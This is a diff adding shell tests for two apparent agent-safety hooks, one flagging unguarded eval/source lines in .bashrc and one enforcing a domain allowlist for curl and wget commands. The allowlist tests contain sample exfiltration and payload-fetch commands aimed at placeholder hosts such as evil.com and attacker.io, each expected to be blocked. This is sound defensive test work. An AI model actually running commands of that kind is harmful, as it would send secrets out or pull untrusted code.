@@ -13295,6 +13295,90 @@ else
 fi
 echo ""
 
+# --- bashrc-safety-check ---
+echo "bashrc-safety-check.sh:"
+# Create temp .bashrc for testing
+_ORIG_HOME="$HOME"
+_TMPDIR=$(mktemp -d)
+export HOME="$_TMPDIR"
+# Test: no .bashrc = pass
+test_ex bashrc-safety-check.sh '{}' 0 "no bashrc = passes"
+# Test: .bashrc with guard = pass (skips check)
+echo 'case $- in *i*) ;; *) return;; esac' > "$_TMPDIR/.bashrc"
+echo 'source <(ng completion script)' >> "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "guarded bashrc = passes"
+# Test: .bashrc with dangerous patterns (no guard) = pass with warning (exit 0)
+echo 'source <(ng completion script)' > "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "unguarded bashrc = passes with warning"
+echo 'eval "$(nvm.sh)"' > "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "nvm pattern detected"
+echo 'eval "$(conda activate base)"' > "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "conda pattern detected"
+echo 'eval "$(pyenv init -)"' > "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "pyenv pattern detected"
+echo 'eval "$(rbenv init -)"' > "$_TMPDIR/.bashrc"
+test_ex bashrc-safety-check.sh '{}' 0 "rbenv pattern detected"
+# Verify warning is emitted for unguarded bashrc
+echo 'source <(ng completion script)' > "$_TMPDIR/.bashrc"
+WARN_OUT=$(echo '{}' | bash "$EXDIR/bashrc-safety-check.sh" 2>&1 >/dev/null)
+if echo "$WARN_OUT" | grep -q "WARNING"; then
+    echo "  PASS: emits warning for unguarded bashrc"
+    PASS=$((PASS + 1))
+else
+    echo "  FAIL: emits warning for unguarded bashrc"
+    FAIL=$((FAIL + 1))
+fi
+# Verify no warning for guarded bashrc
+echo 'case $- in *i*) ;; *) return;; esac' > "$_TMPDIR/.bashrc"
+echo 'source <(ng completion script)' >> "$_TMPDIR/.bashrc"
+WARN_OUT2=$(echo '{}' | bash "$EXDIR/bashrc-safety-check.sh" 2>&1 >/dev/null)
+if [ -z "$WARN_OUT2" ]; then
+    echo "  PASS: no warning for guarded bashrc"
+    PASS=$((PASS + 1))
+else
+    echo "  FAIL: no warning for guarded bashrc (got: $WARN_OUT2)"
+    FAIL=$((FAIL + 1))
+fi
+# Clean bashrc with no dangerous patterns
+echo 'export PATH=$PATH:/usr/local/bin' > "$_TMPDIR/.bashrc"
+WARN_OUT3=$(echo '{}' | bash "$EXDIR/bashrc-safety-check.sh" 2>&1 >/dev/null)
+if [ -z "$WARN_OUT3" ]; then
+    echo "  PASS: no warning for safe bashrc"
+    PASS=$((PASS + 1))
+else
+    echo "  FAIL: no warning for safe bashrc (got: $WARN_OUT3)"
+    FAIL=$((FAIL + 1))
+fi
+export HOME="$_ORIG_HOME"
+rm -rf "$_TMPDIR"
+echo ""
+
+# --- bash-domain-allowlist ---
+echo "bash-domain-allowlist.sh:"
+# Test: no URL in command = pass
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"ls -la"}}' 0 "non-network command passes"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"echo hello"}}' 0 "echo passes"
+# Test: allowed domains pass
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://github.com/api/v3"}}' 0 "github.com allowed"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://api.github.com/repos"}}' 0 "api.github.com allowed"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://raw.githubusercontent.com/file"}}' 0 "raw.githubusercontent.com allowed"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"wget https://registry.npmjs.org/package"}}' 0 "registry.npmjs.org allowed"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl http://localhost:3000/api"}}' 0 "localhost allowed"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl http://127.0.0.1:8080/test"}}' 0 "127.0.0.1 allowed"
+# Test: unauthorized domains blocked
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl http://evil.com/steal"}}' 2 "evil.com blocked"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://attacker.io/exfil?data=secret"}}' 2 "attacker.io blocked"
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"wget http://malicious.org/payload"}}' 2 "malicious.org blocked"
+# Test: HTTP (not just HTTPS) blocked
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl http://evil.com/steal"}}' 2 "plain HTTP to unauthorized blocked"
+# Test: empty command = pass
+test_ex bash-domain-allowlist.sh '{"tool_input":{"command":""}}' 0 "empty command passes"
+test_ex bash-domain-allowlist.sh '{}' 0 "empty input passes"
+# Test: env var override
+CC_ALLOWED_DOMAINS="example.com,test.local" test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://example.com/api"}}' 0 "env var: example.com allowed"
+CC_ALLOWED_DOMAINS="example.com,test.local" test_ex bash-domain-allowlist.sh '{"tool_input":{"command":"curl https://github.com/api"}}' 2 "env var: github.com blocked when not in list"
+echo ""
+
 TOTAL=$((PASS + FAIL))
 echo "Results: $PASS/$TOTAL passed"
 if [ "$FAIL" -gt 0 ]; then
